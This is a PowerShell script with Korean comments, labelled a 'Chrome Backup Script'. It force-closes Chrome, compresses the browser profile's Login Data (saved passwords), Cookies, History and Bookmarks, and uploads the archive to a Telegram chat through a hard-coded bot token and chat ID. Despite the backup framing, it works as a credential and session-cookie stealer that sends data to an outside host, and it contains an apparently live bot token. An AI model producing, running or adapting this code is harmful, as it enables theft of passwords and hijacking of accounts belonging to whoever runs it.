$botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"  # 예: 123456789:ABC...
$chatId   = "8121448802"    # 예: 12345678
# ============================

# 1. 경로 설정
$localAppData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$timestamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
$zipPath = "$env:TEMP\ChromeBackup_$timestamp.zip"

Write-Host "==== Chrome Backup Script Started ====" -ForegroundColor Cyan

# 2. Chrome 프로세스 종료
Write-Host "[1/3] Terminating Chrome processes..." -ForegroundColor Yellow
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 3. 데이터 압축 (비밀번호/쿠키/히스토리/북마크만 포함)
Write-Host "[2/3] Compressing Chrome data..." -ForegroundColor Yellow

if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

# 백업할 파일 목록 (Local State 파일이 제외되었습니다.)
$filesToBackup = @(
    "$localAppData\Default\Cookies",
    "$localAppData\Default\History",
    "$localAppData\Default\Bookmarks",
    "$localAppData\Default\Login Data"
)

# 존재하는 파일만 필터링하여 압축
$validFiles = $filesToBackup | Where-Object { Test-Path $_ }

if ($validFiles.Count -eq 0) {
    Write-Error "Chrome data files not found or path is incorrect."
    exit
}

try {
    # 효율적인 일괄 압축
    Compress-Archive -Path $validFiles -DestinationPath $zipPath -Force
    Write-Host "Backup saved locally at: $zipPath" -ForegroundColor Green
}
catch {
    Write-Error "Compression failed: $_"
    exit
}

# 4. 텔레그램으로 파일 직접 전송 (Rclone 대체)
Write-Host "[3/3] Uploading file to Telegram..." -ForegroundColor Yellow

# PowerShell에서 멀티파트 폼 데이터(파일 업로드)를 처리하는 함수 정의
function Send-TelegramDocument {
    param (
        [string]$token,
        [string]$chat_id,
        [string]$filePath
    )

    $url = "https://api.telegram.org/bot$token/sendDocument"
    $fileItem = Get-Item $filePath
    
    # .NET 클래스를 사용하여 파일 업로드 준비
    Add-Type -AssemblyName 'System.Net.Http'
    $client = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    
    # 파일 스트림 구성
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    
    # 폼 데이터에 파일 및 채팅 ID 추가
    $content.Add($fileContent, "document", $fileItem.Name)
    $content.Add((New-Object System.Net.Http.StringContent($chat_id)), "chat_id")
    $content.Add((New-Object System.Net.Http.StringContent("Chrome Backup Complete! ($timestamp)")), "caption")

    try {
        $task = $client.PostAsync($url, $content)
        $task.Wait()
        $result = $task.Result
        
        if ($result.IsSuccessStatusCode) {
            Write-Host "Upload Successful! Check your Telegram." -ForegroundColor Cyan
        } else {
            Write-Error "Upload Failed. Status: $($result.StatusCode)"
        }
    }
    catch {
        Write-Error "Network Error: $_"
    }
    finally {
        # 리소스 정리
        $fileStream.Dispose()
        $client.Dispose()
        $content.Dispose()
    }
}

# 함수 실행
Send-TelegramDocument -token $botToken -chat_id $chatId -filePath $zipPath

Write-Host "==== Process Finished ====" -ForegroundColor Cyan

